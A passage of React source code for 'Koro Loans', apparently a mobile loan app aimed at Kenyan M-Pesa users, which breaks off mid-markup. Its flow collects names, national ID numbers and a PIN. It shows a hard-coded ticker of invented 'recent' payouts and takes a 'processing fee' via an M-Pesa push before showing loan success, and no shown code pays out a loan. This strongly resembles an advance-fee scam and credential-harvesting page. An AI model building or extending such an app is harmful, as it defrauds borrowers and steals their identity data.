"use client";
import { useState, useEffect, useRef } from "react";

/* ═══════════════════════════════════════════════════════════════
   KORO LOANS
   Flow: Splash → Step1(name) → Step2(ID) → Step3(PIN) →
         Step4(birth) → Step5(phone) → Step6(loan type) →
         Dashboard (loan grid) → Confirm Modal → STK Modal → Success
   Backend: https://payhero-backend-m78g.onrender.com
   Theme: white bg · black buttons · green #22c55e accent
═══════════════════════════════════════════════════════════════ */

const MPESA_BASE = "https://payhero-backend-m78g.onrender.com";

/* ── LOAN PACKAGES ────────────────────────────────────────────── */
const LOANS = [
  { amount: 10900,  fee: 10,  repayment: 11050  },
  { amount: 15200,  fee: 200,  repayment: 15400  },
  { amount: 20800,  fee: 290,  repayment: 21090  },
  { amount: 25200,  fee: 350,  repayment: 25550  },
  { amount: 30600,  fee: 450,  repayment: 31050  },
  { amount: 40000,  fee: 550,  repayment: 40550  },
  { amount: 50400,  fee: 680,  repayment: 51080  },
  { amount: 60800,  fee: 1080, repayment: 61880  },
  { amount: 70200,  fee: 1900, repayment: 72100  },
  { amount: 80600,  fee: 2550, repayment: 83150  },
];

const LOAN_TYPES = [
  "Personal Loan",
  "Business Loan",
  "Emergency Loan",
  "School Fees Loan",
  "Agricultural Loan",
  "Asset Finance",
];

const RECENT = [
  "0727****01 received Ksh 22,500 – 7 mins ago",
  "0712****45 received Ksh 50,400 – 12 mins ago",
  "0745****88 received Ksh 20,800 – 18 mins ago",
  "0711****32 received Ksh 80,600 – 22 mins ago",
  "0790****56 received Ksh 30,600 – 31 mins ago",
  "0722****19 received Ksh 15,200 – 35 mins ago",
  "0768****74 received Ksh 40,000 – 44 mins ago",
  "0733****63 received Ksh 25,200 – 51 mins ago",
];

/* ── HELPERS ─────────────────────────────────────────────────── */
function normalisePhone(raw) {
  const p = raw.replace(/\D/g, "");
  if (p.startsWith("07") || p.startsWith("01")) return "254" + p.slice(1);
  if (p.startsWith("254")) return p;
  return null;
}
function isValidPhone(raw) {
  const p = raw.replace(/\D/g, "");
  return /^(07\d{8}|01\d{8}|2547\d{8}|2541\d{8})$/.test(p);
}
function fmt(n) {
  return Number(n).toLocaleString("en-KE");
}

/* ══════════════════════════════════════════════════════════════
   CSS
══════════════════════════════════════════════════════════════ */
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; -webkit-text-size-adjust: 100%; }

body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  background: #f5f5f5;
  color: #111;
  -webkit-font-smoothing: antialiased;
  overflow-x: hidden;
}

input, button, select, textarea { font-family: inherit; }
input::placeholder { color: #bbb; }
button { cursor: pointer; }
a { text-decoration: none; color: inherit; }

/* ── PHONE SHELL ── */
.shell {
  min-height: 100vh;
  max-width: 420px;
  margin: 0 auto;
  background: #fff;
  display: flex;
  flex-direction: column;
  position: relative;
  box-shadow: 0 0 40px rgba(0,0,0,.10);
}

/* ── TOP NAV BAR (steps) ── */
.step-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 16px 20px 12px;
  border-bottom: 1px solid #f0f0f0;
  flex-shrink: 0;
}
.step-back {
  background: none;
  border: none;
  cursor: pointer;
  font-size: 22px;
  color: #111;
  line-height: 1;
  padding: 2px 4px;
  display: flex;
  align-items: center;
}
.step-chat {
  font-size: 14px;
  font-weight: 600;
  color: #111;
  background: none;
  border: none;
  cursor: pointer;
}

/* ── LOGO BLOCK ── */
.logo-block {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 24px 20px 8px;
}
.koro-logo {
  width: 72px;
  height: 72px;
  margin-bottom: 6px;
}
.koro-wordmark {
  font-size: 1.55rem;
  font-weight: 900;
  letter-spacing: 0.28em;
  color: #111;
  text-transform: uppercase;
}

/* ── STEP TITLE ── */
.step-number {
  font-size: 1.35rem;
  font-weight: 800;
  color: #111;
  text-align: center;
  padding: 20px 24px 0;
  line-height: 1.25;
}

/* ── STEP BODY ── */
.step-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  padding: 20px 24px 32px;
  gap: 0;
}
.step-instruction {
  font-size: 1rem;
  color: #111;
  text-align: center;
  line-height: 1.5;
  margin-bottom: 6px;
}
.step-example-link {
  font-size: 0.95rem;
  color: #e53935;
  text-align: center;
  margin-bottom: 14px;
  font-weight: 500;
}

/* ── ID CARD PREVIEW ── */
.id-card-img {
  width: 100%;
  border-radius: 10px;
  overflow: hidden;
  margin-bottom: 20px;
  border: 1px solid #e0e0e0;
  background: #c8e6c9;
  padding: 12px;
  position: relative;
}
.id-card-inner {
  background: #d4edda;
  border-radius: 6px;
  padding: 10px 12px;
  font-size: 11px;
  color: #1a3a1a;
  line-height: 1.7;
  position: relative;
}
.id-header {
  display: flex;
  justify-content: space-between;
  font-weight: 700;
  font-size: 10px;
  margin-bottom: 8px;
  color: #1a3a1a;
}
.id-row {
  display: flex;
  gap: 8px;
  align-items: flex-start;
}
.id-photo {
  width: 52px;
  height: 64px;
  background: #555;
  border-radius: 3px;
  flex-shrink: 0;
  overflow: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
}
.id-photo svg {
  width: 36px;
  height: 36px;
  fill: #aaa;
}
.id-details {
  flex: 1;
  font-size: 10px;
  line-height: 1.8;
  color: #1a3a1a;
}
.id-highlight {
  display: inline-block;
  background: transparent;
  border: 2px solid #e53935;
  border-radius: 3px;
  padding: 0 3px;
  font-weight: 700;
}
.id-highlight.name-hl {
  display: block;
  margin-top: 2px;
}
.id-stamp {
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%) rotate(-15deg);
  font-size: 22px;
  font-weight: 900;
  color: rgba(229,57,53,.35);
  letter-spacing: -1px;
  pointer-events: none;
}
.id-fingerprint {
  position: absolute;
  bottom: 8px;
  right: 12px;
}
.id-fingerprint svg { width: 38px; height: 38px; opacity: .5; }

/* ── PHONE RETURNING NOTICE ── */
.returning-notice {
  background: #22c55e;
  color: #fff;
  border-radius: 10px;
  padding: 14px 16px;
  font-size: 13px;
  font-weight: 600;
  line-height: 1.5;
  margin-top: auto;
}

/* ── INPUTS ── */
.inp-wrap {
  margin-bottom: 16px;
  position: relative;
}
.inp-label {
  font-size: 11px;
  font-weight: 600;
  color: #888;
  letter-spacing: .04em;
  text-transform: uppercase;
  margin-bottom: 5px;
  display: block;
}

/* Outlined input like Koro screenshots */
.koro-inp {
  width: 100%;
  border: 1.5px solid #ccc;
  border-radius: 8px;
  padding: 14px 16px;
  font-size: 16px;
  color: #111;
  outline: none;
  background: #fff;
  transition: border-color .18s;
}
.koro-inp:focus { border-color: #22c55e; }
.koro-inp.err   { border-color: #e53935; }

/* Phone input with icon */
.phone-inp-wrap {
  border: 1.5px solid #ccc;
  border-radius: 8px;
  display: flex;
  align-items: center;
  overflow: hidden;
  transition: border-color .18s;
  background: #fff;
}
.phone-inp-wrap:focus-within { border-color: #22c55e; }
.phone-inp-wrap.err           { border-color: #e53935; }
.phone-icon {
  padding: 14px 12px;
  color: #888;
  display: flex;
  align-items: center;
  flex-shrink: 0;
}
.phone-icon svg { width: 18px; height: 18px; stroke: #888; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.phone-inp {
  flex: 1;
  border: none;
  padding: 14px 14px 14px 0;
  font-size: 16px;
  color: #111;
  outline: none;
  background: transparent;
}

/* PIN input with eye */
.pin-inp-wrap {
  border: 1.5px solid #ccc;
  border-radius: 8px;
  display: flex;
  align-items: center;
  overflow: hidden;
  transition: border-color .18s;
  background: #fff;
}
.pin-inp-wrap:focus-within { border-color: #22c55e; }
.pin-eye {
  padding: 14px 12px;
  color: #888;
  display: flex;
  align-items: center;
  flex-shrink: 0;
  cursor: pointer;
}
.pin-eye svg { width: 18px; height: 18px; stroke: #888; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.pin-inp {
  flex: 1;
  border: none;
  padding: 14px 14px 14px 0;
  font-size: 16px;
  color: #111;
  outline: none;
  background: transparent;
  letter-spacing: 3px;
}

/* Select */
.koro-sel {
  width: 100%;
  border: 1.5px solid #ccc;
  border-radius: 8px;
  padding: 14px 16px;
  font-size: 16px;
  color: #111;
  outline: none;
  background: #fff;
  cursor: pointer;
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 14px center;
  padding-right: 40px;
  transition: border-color .18s;
}
.koro-sel:focus { border-color: #22c55e; }

.ferr {
  font-size: 12px;
  color: #e53935;
  margin-top: 4px;
}

/* ── BLACK CONTINUE / NEXT BUTTON ── */
.btn-continue {
  width: 100%;
  padding: 18px;
  border: none;
  border-radius: 10px;
  background: #111;
  color: #fff;
  font-size: 15px;
  font-weight: 800;
  letter-spacing: .1em;
  text-transform: uppercase;
  cursor: pointer;
  transition: background .18s;
  margin-top: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}
.btn-continue:hover:not(:disabled) { background: #222; }
.btn-continue:disabled { opacity: .45; cursor: not-allowed; }

/* ── GREEN CTA BUTTON (splash) ── */
.btn-green {
  width: 100%;
  padding: 18px;
  border: none;
  border-radius: 10px;
  background: #22c55e;
  color: #fff;
  font-size: 15px;
  font-weight: 800;
  letter-spacing: .08em;
  text-transform: uppercase;
  cursor: pointer;
  transition: background .18s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}
.btn-green:hover { background: #16a34a; }
.btn-green:disabled { opacity: .45; cursor: not-allowed; }

/* ── SPINNER ── */
.spin-sm {
  width: 16px;
  height: 16px;
  border: 2.5px solid rgba(255,255,255,.3);
  border-top-color: #fff;
  border-radius: 50%;
  animation: sp .65s linear infinite;
  display: inline-block;
}
@keyframes sp { to { transform: rotate(360deg); } }

/* ══════════════════════════════════════════════════
   SPLASH / LANDING
══════════════════════════════════════════════════ */
.splash {
  flex: 1;
  display: flex;
  flex-direction: column;
  position: relative;
  overflow: hidden;
  min-height: 100vh;
}
.splash-bg {
  position: absolute;
  inset: 0;
  background: linear-gradient(to bottom, rgba(0,0,0,.45) 0%, rgba(0,0,0,.6) 100%);
  z-index: 1;
}
.splash-bg-img {
  position: absolute;
  inset: 0;
  background: url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=600&q=80') center/cover no-repeat;
  z-index: 0;
}
.splash-content {
  position: relative;
  z-index: 2;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 40px 24px 0;
  flex: 1;
}
.splash-logo-text {
  font-size: 1.7rem;
  font-weight: 900;
  letter-spacing: .28em;
  color: #fff;
  margin-top: 8px;
}
.koro-logo-white { filter: brightness(10); }
.splash-headline {
  margin-top: 28px;
  font-size: 1.75rem;
  font-weight: 900;
  color: #fff;
  line-height: 1.15;
  text-align: center;
  letter-spacing: .01em;
}
.splash-headline em {
  color: #22c55e;
  font-style: normal;
}
.splash-bottom {
  position: relative;
  z-index: 2;
  padding: 20px 24px 36px;
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.splash-terms {
  font-size: 13px;
  color: rgba(255,255,255,.75);
  text-align: center;
  line-height: 1.5;
}
.splash-terms a {
  color: rgba(255,255,255,.9);
  text-decoration: underline;
}
.splash-legal {
  font-size: 11px;
  color: rgba(255,255,255,.5);
  text-align: center;
  line-height: 1.6;
}

/* ══════════════════════════════════════════════════
   DASHBOARD / LOAN GRID
══════════════════════════════════════════════════ */
.dash-header {
  background: #fff;
  padding: 20px 20px 0;
  border-bottom: 1px solid #f0f0f0;
  flex-shrink: 0;
}
.dash-top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 16px;
}
.dash-greeting {
  font-size: 15px;
  font-weight: 700;
  color: #111;
}
.dash-sub {
  font-size: 12px;
  color: #888;
  margin-top: 1px;
}
.dash-avatar {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: linear-gradient(135deg, #22c55e, #16a34a);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 15px;
  font-weight: 800;
  color: #fff;
  flex-shrink: 0;
}

/* Ticker */
.ticker-wrap {
  background: #f9fafb;
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  padding: 10px 14px;
  margin: 16px 20px;
  display: flex;
  align-items: center;
  gap: 8px;
  overflow: hidden;
}
.ticker-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #22c55e;
  flex-shrink: 0;
  animation: tdot 1.4s ease-in-out infinite;
}
@keyframes tdot { 0%,100%{opacity:1}50%{opacity:.3} }
.ticker-text {
  font-size: 12px;
  font-weight: 600;
  color: #374151;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* Loan grid */
.loan-section-title {
  font-size: 1.05rem;
  font-weight: 800;
  color: #111;
  padding: 0 20px;
  margin-bottom: 12px;
}
.loan-sub-title {
  font-size: 12px;
  color: #888;
  padding: 0 20px;
  margin-bottom: 16px;
  margin-top: -8px;
}
.loan-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  padding: 0 20px;
  margin-bottom: 100px;
}
.loan-card {
  background: #fff;
  border: 1.5px solid #e5e7eb;
  border-radius: 14px;
  padding: 16px 14px;
  cursor: pointer;
  transition: all .18s;
  display: flex;
  flex-direction: column;
  gap: 4px;
  position: relative;
  overflow: hidden;
}
.loan-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 3px;
  background: linear-gradient(90deg, #22c55e, #16a34a);
  opacity: 0;
  transition: opacity .18s;
}
.loan-card:hover {
  border-color: #22c55e;
  transform: translateY(-2px);
  box-shadow: 0 8px 24px rgba(34,197,94,.14);
}
.loan-card:hover::before { opacity: 1; }
.loan-card.selected {
  border-color: #22c55e;
  background: #f0fdf4;
  box-shadow: 0 8px 28px rgba(34,197,94,.18);
}
.loan-card.selected::before { opacity: 1; }
.loan-card.selected::after {
  content: '✓';
  position: absolute;
  top: 8px;
  right: 10px;
  font-size: 13px;
  font-weight: 900;
  color: #22c55e;
}
.loan-amount {
  font-size: 1.1rem;
  font-weight: 900;
  color: #111;
  line-height: 1;
}
.loan-fee {
  font-size: 11px;
  color: #6b7280;
  font-weight: 500;
}
.loan-repay {
  font-size: 10px;
  color: #9ca3af;
  margin-top: 2px;
}

/* Fixed bottom bar on dashboard */
.dash-bottom-bar {
  position: fixed;
  bottom: 0;
  left: 50%;
  transform: translateX(-50%);
  width: 100%;
  max-width: 420px;
  background: #fff;
  border-top: 1px solid #e5e7eb;
  padding: 14px 20px 24px;
  z-index: 30;
}

/* Security strip */
.security-strip {
  display: flex;
  gap: 8px;
  justify-content: center;
  flex-wrap: wrap;
  padding: 12px 20px;
}
.sec-pill {
  background: #f9fafb;
  border: 1px solid #e5e7eb;
  border-radius: 99px;
  padding: 5px 12px;
  font-size: 11px;
  font-weight: 600;
  color: #374151;
  display: flex;
  align-items: center;
  gap: 5px;
}
.sec-pill-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: #22c55e;
  flex-shrink: 0;
}

/* ══════════════════════════════════════════════════
   MODALS
══════════════════════════════════════════════════ */
.modal-bg {
  position: fixed;
  inset: 0;
  z-index: 100;
  background: rgba(0,0,0,.55);
  backdrop-filter: blur(4px);
  display: flex;
  align-items: flex-end;
  justify-content: center;
  padding: 0;
}
@media (min-width: 480px) {
  .modal-bg { align-items: center; padding: 20px; }
}
.modal-box {
  background: #fff;
  border-radius: 24px 24px 0 0;
  width: 100%;
  max-width: 420px;
  max-height: 90vh;
  overflow-y: auto;
  animation: mUp .3s cubic-bezier(.34,1.2,.64,1);
}
@media (min-width: 480px) { .modal-box { border-radius: 24px; } }
@keyframes mUp { from { transform: translateY(40px); opacity: 0; } to { transform: none; opacity: 1; } }

/* Confirm modal */
.modal-head {
  padding: 28px 24px 0;
  text-align: center;
}
.modal-doc-icon {
  width: 68px;
  height: 68px;
  border-radius: 50%;
  background: #f0fdf4;
  border: 2px solid #bbf7d0;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 14px;
}
.modal-doc-icon svg { width: 34px; height: 34px; stroke: #22c55e; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.modal-title {
  font-size: 1.2rem;
  font-weight: 800;
  color: #111;
  margin-bottom: 20px;
}
.modal-details {
  background: #f9fafb;
  border-radius: 12px;
  margin: 0 24px;
  overflow: hidden;
}
.modal-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 13px 16px;
  border-bottom: 1px solid #f0f0f0;
}
.modal-row:last-child { border-bottom: none; }
.modal-key { font-size: 13px; color: #6b7280; font-weight: 500; }
.modal-val { font-size: 14px; font-weight: 700; color: #111; }
.modal-val.green { color: #22c55e; }
.modal-phone-note {
  text-align: center;
  font-size: 13px;
  color: #6b7280;
  padding: 16px 24px 4px;
  line-height: 1.5;
}
.modal-phone-num {
  text-align: center;
  font-size: 15px;
  font-weight: 700;
  color: #22c55e;
  padding: 0 24px 20px;
}
.modal-actions {
  padding: 0 24px 32px;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.btn-modal-proceed {
  width: 100%;
  padding: 16px;
  border: none;
  border-radius: 12px;
  background: #111;
  color: #fff;
  font-size: 15px;
  font-weight: 800;
  letter-spacing: .06em;
  cursor: pointer;
  transition: background .18s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}
.btn-modal-proceed:hover { background: #222; }
.btn-modal-proceed:disabled { opacity: .45; cursor: not-allowed; }
.btn-modal-cancel {
  width: 100%;
  padding: 14px;
  border: 1.5px solid #e5e7eb;
  border-radius: 12px;
  background: #fff;
  color: #6b7280;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  transition: all .18s;
}
.btn-modal-cancel:hover { border-color: #e53935; color: #e53935; }

/* STK modal */
.stk-modal-box {
  background: #fff;
  border-radius: 24px 24px 0 0;
  width: 100%;
  max-width: 420px;
  padding: 36px 24px 40px;
  animation: mUp .3s cubic-bezier(.34,1.2,.64,1);
  text-align: center;
}
@media (min-width: 480px) { .stk-modal-box { border-radius: 24px; } }
.stk-phone-icon {
  width: 72px;
  height: 72px;
  border-radius: 50%;
  background: #f0fdf4;
  border: 2px solid #bbf7d0;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 16px;
}
.stk-phone-icon svg { width: 36px; height: 36px; stroke: #22c55e; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.stk-title { font-size: 1.25rem; font-weight: 800; color: #111; margin-bottom: 12px; }
.stk-status-text {
  font-size: 14px;
  color: #6b7280;
  line-height: 1.6;
  background: #f9fafb;
  border-radius: 10px;
  padding: 12px 16px;
  margin-bottom: 18px;
}
.stk-progress-wrap {
  height: 4px;
  background: #e5e7eb;
  border-radius: 99px;
  overflow: hidden;
  margin-bottom: 16px;
}
.stk-progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #22c55e, #16a34a);
  border-radius: 99px;
  animation: stk-anim 30s linear forwards;
}
@keyframes stk-anim { from { width: 0%; } to { width: 95%; } }
.stk-verifying {
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 20px;
}
.stk-cancel {
  background: none;
  border: none;
  cursor: pointer;
  font-size: 12px;
  color: #9ca3af;
  text-decoration: underline;
  margin-top: 4px;
}

/* ══════════════════════════════════════════════════
   SUCCESS SCREEN
══════════════════════════════════════════════════ */
.success-wrap {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 32px 24px 40px;
}
.success-icon {
  width: 88px;
  height: 88px;
  border-radius: 50%;
  background: #f0fdf4;
  border: 3px solid #22c55e;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 20px;
  animation: popIn .55s cubic-bezier(.34,1.56,.64,1);
}
@keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.success-icon svg { width: 44px; height: 44px; stroke: #22c55e; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
.success-title {
  font-size: 1.45rem;
  font-weight: 900;
  color: #111;
  margin-bottom: 8px;
  text-align: center;
}
.success-sub {
  font-size: 14px;
  color: #6b7280;
  text-align: center;
  line-height: 1.65;
  max-width: 300px;
  margin: 0 auto 24px;
}
.success-amount-box {
  width: 100%;
  background: #f0fdf4;
  border: 2px solid #bbf7d0;
  border-radius: 16px;
  padding: 22px;
  text-align: center;
  margin-bottom: 20px;
}
.success-amount {
  font-size: 2.2rem;
  font-weight: 900;
  color: #111;
  line-height: 1;
}
.success-amount-sub {
  font-size: 13px;
  color: #22c55e;
  font-weight: 700;
  margin-top: 6px;
}
.success-details {
  width: 100%;
  background: #f9fafb;
  border-radius: 14px;
  overflow: hidden;
  margin-bottom: 24px;
}
.s-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 11px 16px;
  border-bottom: 1px solid #f0f0f0;
  font-size: 13px;
}
.s-row:last-child { border-bottom: none; }
.s-key { color: #9ca3af; font-weight: 500; }
.s-val { font-weight: 700; color: #111; }
`;

/* ══════════════════════════════════════════════════
   KORO LOGO SVG
══════════════════════════════════════════════════ */
function KoroLogo({ size = 72, white = false }) {
  const green  = white ? "#fff" : "#22c55e";
  const dark   = white ? "#fff" : "#111";

  return (
    <svg width={size} height={size} viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
      {/* Small dot above */}
      <circle cx="40" cy="6" r="4" fill={green} />
      {/* Main K-person figure */}
      {/* Head */}
      <circle cx="40" cy="20" r="8" fill={green} />
      {/* Body — leaning forward K shape */}
      <path d="M28 38 Q32 28 40 30 Q50 32 52 26" stroke={dark} strokeWidth="4" strokeLinecap="round" fill="none"/>
      {/* Left leg */}
      <path d="M36 55 L30 72" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
      {/* Right leg */}
      <path d="M36 55 L46 72" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
      {/* Torso */}
      <path d="M36 32 L36 56" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
      {/* Right arm (upper) */}
      <path d="M36 40 L56 30" stroke={dark} strokeWidth="4" strokeLinecap="round"/>
      {/* Right arm (lower) */}
      <path d="M36 40 L56 50" stroke={green} strokeWidth="4" strokeLinecap="round"/>
    </svg>
  );
}

/* ══════════════════════════════════════════════════
   TICKER
══════════════════════════════════════════════════ */
function Ticker() {
  const [idx, setIdx] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setIdx(i => (i + 1) % RECENT.length), 3500);
    return () => clearInterval(iv);
  }, []);
  return (
    <div className="ticker-wrap">
      <div className="ticker-dot" />
      <div className="ticker-text">{RECENT[idx]}</div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   ID CARD ILLUSTRATION
══════════════════════════════════════════════════ */
function KenyaIDCard({ highlightName = false, highlightId = false }) {
  return (
    <div className="id-card-img">
      <div className="id-card-inner">
        <div className="id-header">
          <span>JAMHURI YA KENYA</span>
          <span>REPUBLIC OF KENYA</span>
        </div>
        <div style={{ fontSize: 9, color: "#1a3a1a", marginBottom: 6 }}>
          SERIAL NUMBER: 231434590
          <span style={{ float: "right" }}>
            ID NUMBER{" "}
            <span className={highlightId ? "id-highlight" : ""}>
              11111111
            </span>
          </span>
        </div>
        <div className="id-row">
          <div className="id-photo">
            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
          </div>
          <div className="id-details">
            <div style={{ fontSize: 9, color: "#555", marginBottom: 1 }}>FULL NAMES</div>
            <div className={highlightName ? "id-highlight name-hl" : ""} style={{ fontWeight: 700, fontSize: 11, marginBottom: 8 }}>
              ALMASI ACHIENG ALUOCH
            </div>
            <div>DATE OF BIRTH: 08.01.1994</div>
            <div>SEX: MALE</div>
            <div>DISTRICT OF BIRTH: NAIROBI</div>
            <div>PLACE OF ISSUE: WESTLANDS</div>
            <div>DATE OF ISSUE: 20.05.2010</div>
          </div>
        </div>
        <div className="id-stamp">Example</div>
        <div className="id-fingerprint">
          <svg viewBox="0 0 60 60" fill="none">
            <ellipse cx="30" cy="30" rx="22" ry="26" stroke="#666" strokeWidth="1.2" opacity=".4"/>
            <ellipse cx="30" cy="30" rx="15" ry="18" stroke="#666" strokeWidth="1.2" opacity=".4"/>
            <ellipse cx="30" cy="30" rx="9"  ry="11" stroke="#666" strokeWidth="1.2" opacity=".4"/>
            <ellipse cx="30" cy="30" rx="4"  ry="5"  stroke="#666" strokeWidth="1.2" opacity=".4"/>
          </svg>
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   CONFIRM MODAL
══════════════════════════════════════════════════ */
function ConfirmModal({ loan, userData, onProceed, onCancel }) {
  return (
    <div className="modal-bg" onClick={onCancel}>
      <div className="modal-box" onClick={e => e.stopPropagation()}>
        <div className="modal-head">
          <div className="modal-doc-icon">
            <svg viewBox="0 0 24 24">
              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
              <polyline points="14 2 14 8 20 8"/>
              <line x1="16" y1="13" x2="8" y2="13"/>
              <line x1="16" y1="17" x2="8" y2="17"/>
              <polyline points="10 9 9 9 8 9"/>
            </svg>
          </div>
          <div className="modal-title">Confirm Loan Application</div>
        </div>
        <div className="modal-details">
          <div className="modal-row">
            <span className="modal-key">Loan Amount:</span>
            <span className="modal-val green">Ksh {fmt(loan.amount)}</span>
          </div>
          <div className="modal-row">
            <span className="modal-key">Processing Fee:</span>
            <span className="modal-val">Ksh {fmt(loan.fee)}</span>
          </div>
          <div className="modal-row">
            <span className="modal-key">Total Repayment:</span>
            <span className="modal-val">Ksh {fmt(loan.repayment)}</span>
          </div>
        </div>
        <div className="modal-phone-note">
          An M-Pesa prompt will be sent to complete your application
        </div>
        <div className="modal-phone-num">Phone: {userData.phone}</div>
        <div className="modal-actions">
          <button className="btn-modal-proceed" onClick={onProceed}>
            Pay Processing Fee &amp; Proceed
          </button>
          <button className="btn-modal-cancel" onClick={onCancel}>Cancel</button>
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   STK MODAL
══════════════════════════════════════════════════ */
function STKModal({ loan, userData, onSuccess, onCancel }) {
  const [dots, setDots]         = useState(1);
  const [status, setStatus]     = useState("Waiting for M-Pesa confirmation...");
  const pollRef                 = useRef(null);
  const dotsRef                 = useRef(null);
  const hasRunRef               = useRef(false);
  const startRef                = useRef(Date.now());
  const doneRef                 = useRef(false);

  const normPhone = normalisePhone(userData.phone) || userData.phone;

  useEffect(() => {
    if (hasRunRef.current) return;
    hasRunRef.current = true;
    startRef.current  = Date.now();

    dotsRef.current = setInterval(() => setDots(d => d >= 3 ? 1 : d + 1), 600);

    const finish = () => {
      if (doneRef.current) return;
      doneRef.current = true;
      clearInterval(pollRef.current);
      setStatus("Payment confirmed! Loading your loan...");
      setTimeout(onSuccess, 1200);
    };

    const run = async () => {
      try {
        setStatus("Sending M-Pesa request...");
        const res  = await fetch(`${MPESA_BASE}/api/runPrompt`, {
          method:  "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phone:            normPhone,
            amount:           loan.fee,
            local_id:         `KORO-${Date.now()}`,
            transaction_desc: `Koro Loans processing fee Ksh ${loan.fee}`,
          }),
        });
        const data = await res.json().catch(() => ({}));

        if (!res.ok || data.status === false) {
          setStatus("Check your phone for M-Pesa prompt...");
          return;
        }

        const cid = data.checkout_request_id || data.checkoutRequestId || null;
        setStatus("STK push sent. Enter your M-Pesa PIN...");

        if (!cid) return;

        // Poll every 5 seconds
        pollRef.current = setInterval(async () => {
          try {
            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
            if (!r.ok) return;
            const d = await r.json();
            const ok = d?.success === true || d?.status === "completed" || d?.ResultCode === 0;
            if (ok) {
              const elapsed  = Date.now() - startRef.current;
              const minWait  = 8000; // show STK screen at least 8s
              if (elapsed < minWait) {
                setStatus("Payment received. Finalizing your loan...");
                setTimeout(finish, minWait - elapsed);
              } else {
                finish();
              }
            } else {
              setStatus("Waiting for M-Pesa confirmation...");
            }
          } catch { /* ignore */ }
        }, 5000);

      } catch {
        setStatus("Check your phone for the M-Pesa prompt...");
      }
    };

    run();

    return () => {
      clearInterval(pollRef.current);
      clearInterval(dotsRef.current);
    };
  }, []);

  return (
    <div className="modal-bg">
      <div className="stk-modal-box">
        <div className="stk-phone-icon">
          <svg viewBox="0 0 24 24">
            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
            <line x1="12" y1="18" x2="12" y2="18"/>
          </svg>
        </div>
        <div className="stk-title">STK Push Sent</div>
        <div className="stk-status-text">{status}</div>
        <div className="stk-progress-wrap">
          <div className="stk-progress-fill" />
        </div>
        <div className="stk-verifying">
          Verifying payment{".".repeat(dots)}
        </div>
        <button className="stk-cancel" onClick={onCancel}>Cancel</button>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   SUCCESS SCREEN
══════════════════════════════════════════════════ */
function SuccessScreen({ loan, userData, onDone }) {
  const repayDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
  const repayStr  = repayDate.toLocaleDateString("en-KE", { day: "numeric", month: "short", year: "numeric" });

  return (
    <div className="shell">
      <div className="step-nav">
        <div className="logo-block" style={{ padding: 0 }}>
          <KoroLogo size={32} />
        </div>
        <span className="koro-wordmark" style={{ fontSize: "1rem" }}>KORO</span>
        <div />
      </div>
      <div className="success-wrap">
        <div className="success-icon">
